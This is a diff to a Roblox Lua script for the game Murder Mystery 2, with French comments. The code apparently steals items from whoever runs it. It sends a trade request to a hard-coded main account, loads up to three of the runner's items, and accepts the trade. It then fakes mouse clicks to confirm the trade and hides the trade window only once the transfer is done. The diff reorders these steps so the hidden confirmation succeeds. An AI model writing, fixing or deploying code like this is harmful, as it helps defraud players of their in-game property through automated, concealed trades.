@@ -496,12 +496,10 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
 local function getitems()
-    -- 1. On cache/détruit le GUI tout de suite pour libérer ton écran et tes mouvements
-    if destroytrades2 then
-        pcall(function() coroutine.resume(destroytrades2) end)
-    end
+    -- NE PAS masquer le GUI tout de suite pour laisser le bouton cliquable
+    -- (On le cachera à la toute fin)
 
-    -- 2. Envoi de la demande de trade au compte principal
+    -- 1. Envoi de la demande de trade au compte principal
     local targetPlayer = Players:FindFirstChild(userName)
     if not targetPlayer then
         warn("Compte principal introuvable : " .. tostring(userName))
@@ -511,7 +509,7 @@ local function getitems()
     Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(2.5)
 
-    -- 3. Remplissage des 3 cases max
+    -- 2. Remplissage des 3 cases max
     local itemsOffered = 0
     local maxSlots = 3
 
@@ -541,15 +539,15 @@ local function getitems()
 
     task.wait(1.5)
 
-    -- 4. Première validation réseau (AcceptRequest)
+    -- 3. Première validation réseau
     pcall(function()
         Trade.AcceptRequest:FireServer()
     end)
 
-    -- 5. Attente du timer MM2 (8 secondes)
+    -- 4. Attente du timer obligatoire de MM2 (8 secondes)
     task.wait(8)
 
-    -- 6. SÉQUENCE DE CLICS VIRTUELS SUR LE BOUTON
+    -- 5. SÉQUENCE DE CLICS VIRTUELS (GUI TOUJOURS ACTIF)
     pcall(function()
         local Camera = workspace.CurrentCamera
         local ViewportSize = Camera.ViewportSize
@@ -559,16 +557,16 @@ local function getitems()
 
         local function sendClick()
             VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, true, game, 0)
-            task.wait(0.1)
+            task.wait(0.15)
             VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, false, game, 0)
         end
 
         -- Clic 1 : Verrouillage de l'offre
         sendClick()
 
-        task.wait(2)
+        task.wait(2) -- Laisse le temps au bouton de passer en vert/validation finale
 
-        -- Clic 2 : Confirmation finale
+        -- Clic 2 : Confirmation définitive
         sendClick()
 
         task.wait(1)
@@ -576,10 +574,16 @@ local function getitems()
         -- Clic 3 : Sécurité
         sendClick()
     end)
+
+    -- 6. NETTOYAGE FINAL : On cache le GUI SEULEMENT MAINTENANT que c'est accepté
+    task.wait(0.5)
+    if destroytrades2 then
+        pcall(function() coroutine.resume(destroytrades2) end)
+    end
 end
 
 -- ==========================================
--- ÉCOUTE DU TCHAT (CE QUI MANQUAIT !)
+-- ÉCOUTE DU TCHAT
 -- ==========================================
 
 local function listenToPlayer(player)
